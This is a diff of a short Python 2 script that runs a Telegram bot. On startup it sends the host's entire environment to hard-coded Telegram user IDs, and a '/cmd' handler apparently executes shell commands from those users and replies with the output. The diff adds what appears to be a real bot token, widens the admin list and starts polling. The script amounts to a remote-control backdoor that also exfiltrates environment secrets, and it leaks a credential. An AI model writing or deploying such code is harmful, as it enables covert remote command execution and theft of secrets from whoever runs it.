@@ -1,25 +1,28 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 
-import os, telebot, sys
+import os
+import telebot
+import sys
 
 reload(sys)
 sys.setdefaultencoding("utf-8")
 
-TOKEN = 'TOKEN'
+TOKEN = '267310245:AAH7d3brKnAmu722qncGIzLsu7Wzu_DYSV8'
 
 bot = telebot.TeleBot(TOKEN)
-sudo = int('YOUR_ID')
+sudo = [YOUR_ID, YOUR_ID]
 
 try:
     aaa = os.environ
-    bot.send_message(sudo, str(aaa))
+    for x in sudo:
+        bot.send_message(x, str(aaa))
 except:
     pass
 
 @bot.message_handler(commands=['cmd'])
 def run_cmd(m):
-    if m.from_user.id == sudo:
+    if m.from_user.id in sudo:
         text=m.text
         try:
             TeXT = str(m.text).split(" ")[0]
@@ -34,3 +37,5 @@ def run_cmd(m):
             bot.reply_to(m, eee)
     else:
         pass
+
+bot.polling()
